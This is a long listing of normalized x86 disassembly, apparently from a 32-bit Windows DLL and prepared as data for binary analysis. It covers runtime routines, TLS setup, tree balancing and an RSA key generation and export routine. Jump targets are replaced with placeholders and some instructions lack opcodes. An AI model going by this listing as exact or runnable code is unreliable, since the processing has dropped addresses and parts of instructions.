xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_10072800
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x210 ]
push edx
call sub_10065cb8
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1004e6c0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x21c ]
lea edx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x218 ]
push eax
call sub_100556e0
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x4
pop ebx
sub_10006330
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0xa
push eax
call sub_1006ee90
mov ecx [ ebp + 0xc ]
add esp 0x8
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0xa
pop ebp
retn
sub_10006356
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10035d06
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10035d06
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10035d06
push [ esi + 0xc0 ]
call sub_10035d06
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10066af4
push [ esi + 0xd4 ]
call sub_10035d06
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10035d06
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10035d06
pop ecx
push [ esi + 0xb0 ]
call sub_10035d06
push [ esi + 0xbc ]
call sub_10035d06
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10035d06
push [ esi + 0xbc ]
call sub_1001895f
pop ecx
pop ecx
push eax
call sub_10035d06
pop ecx
push eax
call sub_10035d06
push [ esi + 0xbc ]
call sub_100554c6
pop ecx
pop ecx
sub_100064a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
call sub_1006299d
mov [ eax ] 0x16
push 0x3d
push esi
call sub_10067e89
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_10084c32
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_10084be0
mov edi eax
pop ecx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_1002fb6b
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_10013c7e
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10035d06
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_10035d06
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_1002fb6b
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_100610eb
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_100610eb
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_1007fa90
pop ecx
add eax 0x2
push eax
call sub_10067d3a
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10035d06
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_1007fa90
pop ecx
add eax 0x2
push eax
push edi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003cbb0
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push edi
call sub_10035d06
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_1006299d
mov [ eax ] 0x2a
sub_100066f0
cmp edi ebx
je r-xdata
mov eax edi
retn
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
pop esi
test eax eax
je r-xdata
call sub_10055530
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1000673f
push 0x10
mov eax sub_1008515c
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10034e98
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xc ] ebx
ja r-xdata
mov ecx [ ebp + 0xc ]
call sub_10029420
mov eax [ esi + 0x8 ]
mov edi ebx
cmp [ eax + edi * 4 ] 0x0
je r-xdata
lea edi [ ebx + 0x1 ]
cmp edi 0x28
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax + edi * 4 ] ecx
lea ecx [ ebp - 0x10 ]
call sub_10069747
call sub_10013ab8
retn
mov ecx [ eax + edi * 4 ]
call sub_1000ff00
test eax eax
je r-xdata
mov eax edi
shl eax 0x2
push eax
push [ esi + 0x8 ]
call sub_100725a4
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x28
pop edi
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov [ esi + 0x8 ] eax
jmp r-xdata
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
cmp [ esi + 0xc ] edi
jb r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_1001f7a0
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_10024fe9
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov [ ebp + 0x8 ] r--data
call sub_1004caf9
push sub_1008b00a
mov [ rw-data ] esi
call sub_100592b3
pop ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax * 4 ] 0x0
inc [ esi + 0xc ]
sub_10006840
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
cmp eax 0x1ffffffe
jb r-xdata
inc eax
push ebx
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edi + 0x4 ] eax
mov edx [ ecx + 0x4 ]
xor bl bl
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
call sub_100187af
add esp 0x4
push r--data
call sub_1000831a
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ edx + 0x4 ] edi
mov edx [ ecx + 0x4 ]
mov [ edx ] edi
mov eax [ ecx + 0x4 ]
mov [ eax + 0x8 ] edi
jmp r-xdata
mov [ eax + 0x8 ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ eax ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax edi
cmp [ edx + 0x14 ] bl
jne r-xdata
mov [ edx + 0x8 ] edi
mov [ edx ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
mov [ ecx + 0x14 ] 0x1
pop ebx
pop ebp
retn 0x10
push esi
lea ebx [ ebx ]
mov esi [ esi ]
cmp [ esi + 0x14 ] bl
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] bl
jne r-xdata
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax ]
mov esi [ edx + 0x8 ]
mov [ eax ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax + 0x8 ]
mov esi [ edx ]
mov [ eax + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edx [ eax + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_10006a65
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_10035873
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10006aa0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_10035d06
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10006ada
push 0x4
mov eax sub_1008554e
call sub_100624bc
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1007127d
mov eax esi
call sub_10013ab8
retn 0x8
sub_10006b0d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_100528c9
fstp [ ebp + 0x8 ]
add esp 0xc
fld [ ebp + 0x8 ]
pop ebp
retn
sub_10006b30
push ebp
mov ebp esp
push 0xffffffff
push sub_10086868
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
mov edi ecx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10037e00
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
push ebx
mov eax edi
mov [ ebp - 0x4 ] ebx
call sub_10003f90
add esp 0xc
cmp eax 0xffffffd6
jne r-xdata
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push r--data
mov ecx esi
mov [ esi ] bl
call sub_10037e00
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
push eax
call sub_1001df01
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x34 ]
push ecx
mov [ ebp - 0x30 ] eax
push eax
mov eax edi
call sub_10003f90
mov edi [ ebp - 0x30 ]
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10034c90
add esp 0x4
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_10021bf0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ ebp - 0x2c ]
push eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_10037e00
call sub_100187af
add esp 0x4
sub_10006c60
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
push edi
lea edi [ esi + 0x10 ]
push edi
push r--data
push eax
call edx
mov [ esi ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ esi ] 0x0
jl r-xdata
call [ CoUninitialize@IAT ]
mov eax [ esi ]
pop edi
retn
mov eax [ edi ]
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
push 0x1
push 0x0
push eax
call edx
mov edi [ edi ]
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
sub_10006cb0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_1000831a
pop ebp
retn 0x4
push ebx
push edi
call sub_100630b0
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_1007ec90
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_100187af
add esp 0x4
sub_10006d30
push ebp
mov ebp esp
push 0xffffffff
push sub_10088502
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10021f90
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10021f90
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] dx
push eax
jmp r-xdata
call sub_100649e0
sub_10006e20
push ebp
mov ebp esp
push 0xffffffff
push sub_1008646b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_1001613a
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_1001f84c
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_1006a233
mov [ edi ] eax
call sub_1001706d
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_10034e98
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10069747
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10006f0e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10071ca2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10006f30
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
pop esi
jmp eax
sub_10006f82
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_100281cd
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1003f7f7
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1003860a
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_1002b5dd
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_100281cd
mov edi [ DecodePointer@IAT ]
push sub_100164fc
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_10067d3a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1002be1e
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_100070fd
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x18 ]
or eax 0x80
shl eax 0x10
push eax
push 0xa400
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
push [ ebx ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x14
push [ ebp + 0xc ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
push [ ebp + 0x14 ]
push edi
push edi
push 0x7
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
mov eax [ ebp + 0x14 ]
push [ eax ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x6
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x7
jmp r-xdata
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x8
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_1000723f
push 0x34
mov eax sub_100852df
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
